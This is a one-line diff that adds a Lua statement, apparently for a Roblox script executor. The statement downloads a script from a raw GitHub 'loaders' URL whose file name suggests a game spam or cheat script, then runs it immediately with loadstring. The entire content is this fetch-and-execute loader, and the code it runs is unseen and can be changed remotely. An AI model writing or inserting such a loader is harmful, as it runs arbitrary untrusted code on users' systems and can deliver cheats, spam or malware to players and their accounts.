@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/upd-8-cvr-retro-spam3-wc8orzmefiylpn.lua"))()
